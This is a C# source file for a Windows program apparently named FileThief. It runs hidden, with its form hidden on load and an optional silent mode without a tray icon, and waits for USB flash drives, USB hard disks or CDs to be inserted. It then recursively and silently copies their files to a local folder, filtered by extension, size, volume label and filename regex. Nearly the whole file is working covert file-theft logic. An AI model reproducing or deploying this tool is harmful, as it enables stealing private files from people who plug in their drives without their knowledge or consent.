using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace FileThief
{
    public partial class FrmMain : Form
    {
        public static int debugint;

        public const int WmDevicechange = 0x219;
        public const int DbtDevicearrival = 0x8000;
        public const int DbtConfigchangecanceled = 0x19;
        public const int DbtConfigchanged = 0x18;
        public const int DbtCustomevent = 0x8006;
        public const int DbtDevicequeryremove = 0x8001;
        public const int DbtDevicequeryremovefailed = 0x8002;
        public const int DbtDeviceremovecomplete = 0x8004;
        public const int DbtDeviceremovepending = 0x8003;
        public const int DbtDevicetypespecific = 0x8005;
        public const int DbtDevnodesChanged = 0x7;
        public const int DbtQuerychangeconfig = 0x17;
        public const int DbtUserdefined = 0xFFFF;

        public static string UsbDrive, UsbLabel;

        public static bool IsAllFiles;

        public FrmMain()
        {
            InitializeComponent();
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WmDevicechange)
            {
                switch (m.WParam.ToInt32())
                {
                    case WmDevicechange:
                        break;
                    case DbtDevicearrival:
                        // USB Driver Connected 
                        /*
                        var s = DriveInfo.GetDrives();
                        foreach (var drive in s)
                        {
                            if (drive.DriveType == DriveType.Removable && drive.IsReady && ClsMain.Status)
                            {
                                UsbDrive = drive.Name;
                                // If there's no volume label, use Name and Serial Number. eg: H (XXXXXXXX)
                                UsbLabel = drive.VolumeLabel != "" ? drive.VolumeLabel : drive.Name.Replace(":\\", "") +" (" + drive.GetHashCode() + ")";
                                if (ClsMain.ConLogInfo == "1") WriteLog("新设备接入，盘符 " + UsbDrive + ", 卷标 " + UsbLabel, 0, ClsMain.ConLogPath);
                                var tScanFile =new Thread(StartThread);
                                tScanFile.Start();
                                }
                            
                        }*/
                        DelegateGetDrives gdi = GetDrives;
                        IAsyncResult result = gdi.BeginInvoke(null, "");
                        gdi.EndInvoke(result);
                        break;
                    case DbtConfigchangecanceled:
                        break;
                    case DbtConfigchanged:
                        break;
                    case DbtCustomevent:
                        break;
                    case DbtDevicequeryremove:
                        break;
                    case DbtDevicequeryremovefailed:
                        break;
                    case DbtDeviceremovecomplete:
                        // USB Driver Disconnected
                        if (ClsMain.ConLogInfo == "1") WriteLog("设备已弹出", 0, ClsMain.ConLogPath);
                        break;
                    case DbtDeviceremovepending:
                        break;
                    case DbtDevicetypespecific:
                        break;
                    case DbtDevnodesChanged:
                        break;
                    case DbtQuerychangeconfig:
                        break;
                    case DbtUserdefined:
                        break;
                }
            }
            base.WndProc(ref m);
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            if (!File.Exists(ClsMain.StrConfig))
            {
                ClsMain.WriteIni("FileType", "Type", "", ClsMain.StrConfig);
                ClsMain.WriteIni("FileType", "TypeMode", "0", ClsMain.StrConfig);
                ClsMain.WriteIni("FileType", "Size", "10240", ClsMain.StrConfig);
                ClsMain.WriteIni("FileType", "SizeMode", "0", ClsMain.StrConfig);
                ClsMain.WriteIni("FileType", "Path", "", ClsMain.StrConfig);

                ClsMain.WriteIni("FileName", "RegExp", "", ClsMain.StrConfig);

                ClsMain.WriteIni("Driver", "VolumeLabel", "", ClsMain.StrConfig);
                ClsMain.WriteIni("Driver", "VolumeLabelMode", "0", ClsMain.StrConfig);

                ClsMain.WriteIni("Log", "WriteLog", "1", ClsMain.StrConfig);
                ClsMain.WriteIni("Log", "LogPath", Application.StartupPath + "\\FileThief.log", ClsMain.StrConfig);
                ClsMain.WriteIni("Log", "LogError", "1", ClsMain.StrConfig);
                ClsMain.WriteIni("Log", "LogInfo", "1", ClsMain.StrConfig);

                ClsMain.WriteIni("General", "Startup", "0", ClsMain.StrConfig);
                ClsMain.WriteIni("General", "SilentMode", "0", ClsMain.StrConfig);

                ClsMain.WriteIni("DriverType", "USBDisk", "1", ClsMain.StrConfig);
                ClsMain.WriteIni("DriverType", "USBHD", "1", ClsMain.StrConfig);
                ClsMain.WriteIni("DriverType", "ROM", "0", ClsMain.StrConfig);
                LoadSettings();
                if (!Directory.Exists(Application.StartupPath + "\\Files")) Directory.CreateDirectory(Application.StartupPath + "\\Files");
                if (!File.Exists(ClsMain.ConLogPath)) File.WriteAllText(ClsMain.ConLogPath, "FileThief 日志\n\r\n\r", Encoding.UTF8);
                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1"){ WriteLog("FileThief 开始运行", 0, ClsMain.ConLogPath);}
            }
            else
            {
                LoadSettings();
                if (!Directory.Exists(ClsMain.ConPath) && ClsMain.ConPath != "") Directory.CreateDirectory(ClsMain.ConPath);
                if (!File.Exists(ClsMain.ConLogPath)) File.WriteAllText(ClsMain.ConLogPath, "FileThief 日志\n\r\n\r", Encoding.UTF8);
                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1") WriteLog("FileThief 开始运行", 0, ClsMain.ConLogPath);
            }
            if (ClsMain.ConSilent == "0")
            {
                ntf.Visible = true;
            }
            // Hide Form
            BeginInvoke(new Action(() => {
                Hide();
                Opacity = 1;
            }));
            
        }

        public void LoadSettings()
        {
            //rar|zip|7z|doc|docx|ppt|pptx|xls|xlsx|mp3|mp4|3gp|mov|avi|dat|jpg|png|bmp
            // Check whether copying all files or not
            if (ClsMain.ReadIni("FileType", "Type", "", ClsMain.StrConfig) != "")
            {
                ClsMain.ConType = ClsMain.ReadIni("FileType", "Type", "", ClsMain.StrConfig).Split('|');
                IsAllFiles = false;
            }
            else
            {
                IsAllFiles = true;
            }
            
            ClsMain.BType = ClsMain.ReadIni("FileType", "TypeMode", "0", ClsMain.StrConfig);
            ClsMain.CType = ClsMain.ReadIni("FileType", "Type", "", ClsMain.StrConfig);
            ClsMain.ConSize = Convert.ToInt32(ClsMain.ReadIni("FileType", "Size", "10240", ClsMain.StrConfig));
            ClsMain.BSize = ClsMain.ReadIni("FileType", "SizeMode", "0", ClsMain.StrConfig);
            ClsMain.ConPath = ClsMain.ReadIni("FileType", "Path", Application.StartupPath + "\\Files", ClsMain.StrConfig);

            ClsMain.ConFileNameRegExp = ClsMain.ReadIni("FileName", "RegExp", "", ClsMain.StrConfig);

            ClsMain.ConLabel = ClsMain.ReadIni("Driver", "VolumeLabel", "", ClsMain.StrConfig).Split(new char[] { '|' });
            ClsMain.BLabel = ClsMain.ReadIni("Driver", "VolumeLabelMode", "0", ClsMain.StrConfig);
            ClsMain.CLabel = ClsMain.ReadIni("Driver", "VolumeLabel", "", ClsMain.StrConfig);

            ClsMain.ConLog = ClsMain.ReadIni("Log", "WriteLog", "1", ClsMain.StrConfig);
            ClsMain.ConLogPath = ClsMain.ReadIni("Log", "LogPath", "", ClsMain.StrConfig);
            ClsMain.ConLogErr = ClsMain.ReadIni("Log", "LogError", "1", ClsMain.StrConfig);
            ClsMain.ConLogInfo = ClsMain.ReadIni("Log", "LogInfo", "1", ClsMain.StrConfig);

            ClsMain.ConStartup = ClsMain.ReadIni("General", "Startup", "0", ClsMain.StrConfig);
            ClsMain.ConSilent = ClsMain.ReadIni("General", "SilentMode", "1", ClsMain.StrConfig);

            ClsMain.ConUSBDisk = ClsMain.ReadIni("DriverType", "USBDisk", "1", ClsMain.StrConfig);
            ClsMain.ConUSBHD = ClsMain.ReadIni("DriverType", "USBHD", "1", ClsMain.StrConfig);
            ClsMain.ConROM = ClsMain.ReadIni("DriverType", "ROM", "0", ClsMain.StrConfig);
        }

        public static void ScanFile(string driver, string[] volumeLabel, string[] extension, string regExp)
        {
            if (driver != "")
            {
                var mDirInfo = new DirectoryInfo(driver);
                try
                {
                    //Specified Volume Label
                    if (volumeLabel.Length >= 1 && volumeLabel[0] != "")
                    {
                        foreach (var vLabel in volumeLabel)
                        {
                            // Check Volume Label
                            if ((vLabel == UsbLabel && ClsMain.BLabel=="0") | (vLabel != UsbLabel && ClsMain.BLabel=="1")) 
                            {
                                // Check whether copying all files or not
                                if (IsAllFiles == false)
                                {
                                    // Check Extension Name
                                    foreach (string exName in extension) 
                                    {
                                        foreach (var mFileInfo in mDirInfo.GetFiles("*." + exName).Where(f => f.Extension == "." + exName).ToList())
                                        {
                                            double dFileLength = mFileInfo.Length / (double) 1024;
                                            // Check File Size
                                            if (Math.Round(dFileLength, MidpointRounding.AwayFromZero) <=
                                                ClsMain.ConSize) 
                                            {
                                                var fn = Path.GetDirectoryName(mFileInfo.FullName.Replace(
                                                    UsbDrive.Replace("\\", ""), ClsMain.ConPath + "\\" + UsbLabel));
                                                // Check File Name using RegExp
                                                if (ClsMain.ConFileNameRegExp != "")
                                                {
                                                    Regex regex =
                                                        new Regex(ClsMain.ConFileNameRegExp, RegexOptions.IgnoreCase);
                                                    if (regex.IsMatch(Path.GetFileName(mFileInfo.FullName)))
                                                    {
                                                        MatchCollection matchCollection =
                                                            regex.Matches(Path.GetFileName(mFileInfo.FullName));
                                                        foreach (Match match in matchCollection)
                                                        {
                                                            // Check status
                                                            if (ClsMain.Status)
                                                            {
                                                                // Create Directory if Not Exists
                                                                if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
                                                                    Directory.CreateDirectory(
                                                                        ClsMain.ConPath + "\\" + UsbLabel);
                                                                if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
                                                                // Copy File
                                                                File.Copy(mFileInfo.FullName,
                                                                mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
                                                                    ClsMain.ConPath + "\\" + UsbLabel), true);
                                                                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
                                                                    WriteLog("已复制 " + mFileInfo.FullName, 0,
                                                                     ClsMain.ConLogPath);
                                                            }
                                                        }
                                                    }
                                                }
                                                else
                                                {
                                                    // Check status
                                                    if (ClsMain.Status)
                                                    {
                                                        // Create Directory if Not Exists
                                                    if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
                                                        Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
                                                    if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
                                                    // Copy File
                                                    File.Copy(mFileInfo.FullName,
                                                        mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
                                                            ClsMain.ConPath + "\\" + UsbLabel),
                                                        true);
                                                    if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
                                                        WriteLog("已复制 " + mFileInfo.FullName, 0,
                                                            ClsMain.ConLogPath);
                                                    }
                                                    
                                                }
                                            }
                                        }
                                    }
                                    foreach (DirectoryInfo mDir in mDirInfo.GetDirectories())
                                    {
                                        ScanFile(mDir.FullName, volumeLabel, extension, ClsMain.ConFileNameRegExp);
                                    }
                                }
                                else
                                {
                                    foreach (var mFileInfo in mDirInfo.GetFiles())
                                    {
                                        double dFileLength = mFileInfo.Length / (double)1024;
                                        if (Math.Round(dFileLength, MidpointRounding.AwayFromZero) <=
                                            ClsMain.ConSize) // Check File Size
                                        {
                                            var fn = Path.GetDirectoryName(mFileInfo.FullName.Replace(
                                                UsbDrive.Replace("\\", ""), ClsMain.ConPath + "\\" + UsbLabel));
                                            // Check File Name using RegExp
                                            if (ClsMain.ConFileNameRegExp != "")
                                            {
                                                Regex regex =
                                                    new Regex(ClsMain.ConFileNameRegExp, RegexOptions.IgnoreCase);
                                                if (regex.IsMatch(Path.GetFileName(mFileInfo.FullName)))
                                                {
                                                    MatchCollection matchCollection =
                                                        regex.Matches(Path.GetFileName(mFileInfo.FullName));
                                                    foreach (Match match in matchCollection)
                                                    {
                                                        // Check status
                                                        if (ClsMain.Status)
                                                        {
                                                            // Create Directory if Not Exists
                                                        if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
                                                            Directory.CreateDirectory(
                                                                ClsMain.ConPath + "\\" + UsbLabel);
                                                        if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
                                                        // Copy File
                                                        File.Copy(mFileInfo.FullName,
                                                            mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
                                                                ClsMain.ConPath + "\\" + UsbLabel), true);
                                                        if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")  
                                                            WriteLog("已复制 " + mFileInfo.FullName, 0,
                                                                ClsMain.ConLogPath);
                                                        }
                                                    }
                                                }
                                                else
                                                {
                                                    // Check status
                                                    if (ClsMain.Status)
                                                    {
                                                        // Create Directory if Not Exists
                                                    if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
                                                        Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
                                                    if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
                                                    // Copy File
                                                    File.Copy(mFileInfo.FullName,
                                                        mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
                                                            ClsMain.ConPath + "\\" + UsbLabel),
                                                        true);
                                                    if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
                                                        WriteLog("已复制 " + mFileInfo.FullName, 0,
                                                            ClsMain.ConLogPath);
                                                    }
                                                    
                                                }
                                            }
                                        }
                                    }
                                    foreach (DirectoryInfo mDir in mDirInfo.GetDirectories())
                                    {
                                        ScanFile(mDir.FullName, volumeLabel, extension, ClsMain.ConFileNameRegExp);
                                    }
                                }
                            }
                        }
                    }
                    else
                    {
                        // Not specified Volume Label
                        // Check whether copying all files or not
                        if (IsAllFiles == false)
                        {
                            // Check Extension Name
                            foreach (string exName in extension)
                            {
                                foreach (var mFileInfo in mDirInfo.GetFiles("*." + exName).Where(f => f.Extension == "."+exName).ToList())
                                {
                                    double dFileLength = mFileInfo.Length / (double) 1024;
                                    if (Math.Round(dFileLength, MidpointRounding.AwayFromZero) <=
                                        ClsMain.ConSize) // Check File Size
                                    {
                                        var fn = Path.GetDirectoryName(mFileInfo.FullName.Replace(
                                            UsbDrive.Replace("\\", ""), ClsMain.ConPath + "\\" + UsbLabel));
                                        // Copy File
                                        // Check File Name using RegExp
                                        if (ClsMain.ConFileNameRegExp != "")
                                        {
                                            Regex regex =
                                                new Regex(ClsMain.ConFileNameRegExp, RegexOptions.IgnoreCase);
                                            if (regex.IsMatch(Path.GetFileName(mFileInfo.FullName)))
                                            {
                                                MatchCollection matchCollection =
                                                    regex.Matches(Path.GetFileName(mFileInfo.FullName));
                                                foreach (Match match in matchCollection)
                                                {
                                                    // Check status
                                                    if (ClsMain.Status)
                                                    {
                                                        // Create Directory if Not Exists
                                                    if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
                                                        Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
                                                    if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
                                                    // Copy File
                                                    File.Copy(mFileInfo.FullName,
                                                        mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
                                                            ClsMain.ConPath + "\\" + UsbLabel),
                                                        true);
                                                    if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
                                                        WriteLog("已复制 " + mFileInfo.FullName, 0,
                                                            ClsMain.ConLogPath);
                                                    }
                                                }
                                            }
                                        }
                                        else
                                        {
                                            // Check status
                                            if (ClsMain.Status)
                                            {
                                                // Create Directory if Not Exists
                                            if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
                                                Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
                                            if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
                                            // Copy File
                                            {
                                                File.Copy(mFileInfo.FullName,
                                                    mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
                                                        ClsMain.ConPath + "\\" + UsbLabel),
                                                    true);
                                                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
                                                {
                                                    WriteLog("已复制 " + mFileInfo.FullName, 0, ClsMain.ConLogPath);
                                                }
                                            }
                                            }
                                        }
                                    }
                                }
                            }
                            foreach (DirectoryInfo mDir in mDirInfo.GetDirectories())
                            {
                                ScanFile(mDir.FullName, volumeLabel, extension, ClsMain.ConFileNameRegExp);
                            }
                        }
                        else
                        {
                            foreach (FileInfo mFileInfo in mDirInfo.GetFiles())
                            {
                                double dFileLength = mFileInfo.Length / (double)1024;
                                if (Math.Round(dFileLength, MidpointRounding.AwayFromZero) <=
                                    ClsMain.ConSize) // Check File Size
                                {
                                    var fn = Path.GetDirectoryName(mFileInfo.FullName.Replace(
                                        UsbDrive.Replace("\\", ""), ClsMain.ConPath + "\\" + UsbLabel));
                                    // Copy File
                                    // Check File Name using RegExp
                                    if (ClsMain.ConFileNameRegExp != "")
                                    {
                                        Regex regex =
                                            new Regex(ClsMain.ConFileNameRegExp, RegexOptions.IgnoreCase);
                                        if (regex.IsMatch(Path.GetFileName(mFileInfo.FullName)))
                                        {
                                            MatchCollection matchCollection =
                                                regex.Matches(Path.GetFileName(mFileInfo.FullName));
                                            foreach (Match match in matchCollection)
                                            {
                                                if (ClsMain.Status)
                                                {
                                                    // Create Directory if Not Exists
                                                if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
                                                    Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
                                                if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
                                                // Copy File
                                                File.Copy(mFileInfo.FullName,
                                                    mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
                                                        ClsMain.ConPath + "\\" + UsbLabel),
                                                    true);
                                                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
                                                    WriteLog("已复制 " + mFileInfo.FullName, 0,
                                                        ClsMain.ConLogPath);
                                                }
                                            }
                                        }
                                    }
                                    else
                                    {
                                        // Check status
                                        if (ClsMain.Status)
                                        {
                                            // Create Directory if Not Exists
                                        if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
                                            Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
                                        if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
                                        // Copy File
                                        {
                                            File.Copy(mFileInfo.FullName,
                                                mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
                                                    ClsMain.ConPath + "\\" + UsbLabel),
                                                true);
                                            if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
                                            {
                                                WriteLog("已复制 " + mFileInfo.FullName, 0, ClsMain.ConLogPath);
                                            }
                                        }
                                        }
                                        
                                    }
                                }
                            }
                            foreach (DirectoryInfo mDir in mDirInfo.GetDirectories())
                            {
                                ScanFile(mDir.FullName, volumeLabel, extension, ClsMain.ConFileNameRegExp);
                            }
                        }
                        
                    }
                }
                catch (Exception ex)
                {
                    if (ClsMain.ConLog == "1" && ClsMain.ConLogErr == "1") WriteLog(ex.Message, 1, ClsMain.ConLogPath);
                }
            }
        }

        private void tsmiSettings_Click(object sender, EventArgs e)
        {
            new FrmSettings().Show();
        }

        private void tsmiStartStop_Click(object sender, EventArgs e)
        {
            ClsMain.Status = !ClsMain.Status;
            if (ClsMain.Status)
            {
                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1") WriteLog("FileThief 开始运行", 0, ClsMain.ConLogPath);
                tsmiStartStop.Text = "停止(&S)";
            }
            else
            {
                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1") WriteLog("FileThief 停止运行", 0, ClsMain.ConLogPath);
                tsmiStartStop.Text = "启动(&S)";
            }
        }

        private void tsmiAbout_Click(object sender, EventArgs e)
        {
            new FrmAbout().Show();
        }

        public static void WriteLog(string content, int logType, string path)
        {
            var dt = DateTime.Now;
            using (var file = new StreamWriter(path, true))
            {
                switch (logType)
                {
                    case 0: // Info
                        file.WriteLine("[" + dt.ToString("yyyy年MM月dd日 HH:mm:ss", DateTimeFormatInfo.InvariantInfo) + "][信息] " + content);
                        break;
                    case 1: // Error
                        file.WriteLine("[" + dt.ToString("yyyy年MM月dd日 HH:mm:ss", DateTimeFormatInfo.InvariantInfo) + "][错误] " + content);
                        break;
                } 
            }
        }

        public static void StartThread()
        {
            ScanFile(UsbDrive, ClsMain.ConLabel, ClsMain.ConType, ClsMain.ConFileNameRegExp);
        }

        private static void CheckAllDriveType(List<string> usbDriveNames)
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            foreach (DriveInfo d in allDrives)
            {
                bool isUsb = usbDriveNames.Contains(d.Name.Substring(0, 2));
                switch (d.DriveType)
                {
                    case DriveType.Removable:
                        if (d.IsReady && ClsMain.ConUSBDisk=="1" && ClsMain.Status )
                            {
                            UsbDrive = d.Name;
                            // If there's no volume label, use Name and Serial Number. eg: H (XXXXXXXX)
                            UsbLabel = d.VolumeLabel != "" ? d.VolumeLabel : d.Name.Replace(":\\", "") + " (" + d.GetHashCode() + ")";
                            if (ClsMain.ConLogInfo == "1") WriteLog("新设备接入，盘符 " + UsbDrive + ", 卷标 " + UsbLabel +" , USB 闪存盘", 0, ClsMain.ConLogPath);
                            var tScanFile = new Thread(StartThread);
                            tScanFile.Start();
                        }
                        break;
                    case DriveType.Fixed:
                        if (isUsb)
                        {
                            if (d.IsReady && ClsMain.ConUSBHD == "1" && ClsMain.Status)
                            {
                                UsbDrive = d.Name;
                                // If there's no volume label, use Name and Serial Number. eg: H (XXXXXXXX)
                                UsbLabel = d.VolumeLabel != "" ? d.VolumeLabel : d.Name.Replace(":\\", "") + " (" + d.GetHashCode() + ")";
                                if (ClsMain.ConLogInfo == "1") WriteLog("新设备接入，盘符 " + UsbDrive + ", 卷标 " + UsbLabel + " , USB 硬盘", 0, ClsMain.ConLogPath);
                                var tScanFile = new Thread(StartThread);
                                tScanFile.Start();
                            }
                        }
                        break;
                    case DriveType.CDRom:
                        if (d.IsReady && ClsMain.ConROM == "1" && ClsMain.Status)
                        {
                            UsbDrive = d.Name;
                            // If there's no volume label, use Name and Serial Number. eg: H (XXXXXXXX)
                            UsbLabel = d.VolumeLabel != "" ? d.VolumeLabel : d.Name.Replace(":\\", "") + " (" + d.GetHashCode() + ")";
                            if (ClsMain.ConLogInfo == "1") WriteLog("新设备接入，盘符 " + UsbDrive + ", 卷标 " + UsbLabel + ", 光盘", 0, ClsMain.ConLogPath);
                            var tScanFile = new Thread(StartThread);
                            tScanFile.Start();
                        }
                        break;
                }
            }
        }

        private static List<string> GetAllUsbDriveNames()
        {
            // Fuck the empty card reader!
            // 日**的空读卡器
            var searcher = new ManagementObjectSearcher();
            searcher.Query = new SelectQuery("Win32_DiskDrive", "InterfaceType = \"USB\"");
            var usbDiskDrives = searcher.Get().Cast<ManagementObject>();
            var usbDriveNames = new List<string>();
            foreach (var usbDiskDrive in usbDiskDrives)
            {
                searcher.Query = new SelectQuery("Win32_DiskDriveToDiskPartition");
                var diskDriveToDiskPartition = searcher.Get().Cast<ManagementObject>();

                searcher.Query = new SelectQuery("Win32_LogicalDiskToPartition");
                var logicalDiskToPartition = searcher.Get().Cast<ManagementObject>();

                searcher.Query = new SelectQuery("Win32_LogicalDisk");
                var logicalDisk = searcher.Get().Cast<ManagementObject>();

                var usbPartition =
                    diskDriveToDiskPartition.First(p => p["Antecedent"].ToString() == usbDiskDrive.ToString())[
                        "Dependent"].ToString();
                var usbLogicalDisk =
                    logicalDiskToPartition.First(p => p["Antecedent"].ToString() == usbPartition)["Dependent"].ToString();
                foreach (ManagementObject disk in logicalDisk)
                {
                    if (disk.ToString() == usbLogicalDisk)
                    {
                        usbDriveNames.Add(disk["DeviceID"].ToString());
                    }
                }
            }
            return usbDriveNames;
        }

        // Solution from https://ask.helplib.com/1597252
        public delegate void DelegateGetDrives();
        private void GetDrives()
        {
            var usbDriveNames = GetAllUsbDriveNames();
            CheckAllDriveType(usbDriveNames);
        }
    }
}